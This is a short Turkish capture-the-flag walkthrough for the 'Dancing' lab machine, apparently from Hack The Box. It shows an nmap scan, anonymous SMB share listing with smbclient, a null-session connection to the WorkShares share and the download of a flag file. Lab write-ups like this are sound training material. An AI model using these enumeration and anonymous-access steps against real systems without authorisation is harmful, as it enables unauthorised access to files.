---
glightbox: true
---

# Dancing

!!! info "Target IP Address"

    10.129.20.116

Hedef makine için Nmap taraması gerçekleştir:

```bash
sudo nmap 10.129.20.116 -sV
```

```text title="Output" hl_lines="8"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-21 23:02 +03
Nmap scan report for 10.129.20.116
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.85 seconds
```

Aşağıdaki komut ile mevcut Share klasörlerini listele:

```bash
smbclient -N -L 10.129.20.116
```

```text title="Output" hl_lines="6"
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.20.116 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Bulunan `WorkShares` klasörüne SMB bağlantısı gerçekleştir:

```bash
smbclient -N //10.129.20.116/WorkShares
```

Aşağıdaki komut ile bayrağı yerel makineye indir:

```text
get James.P\flag.txt
```

Aşağıdaki komut ile bayrağı ele geçir:

```bash
cat flag.txt
```
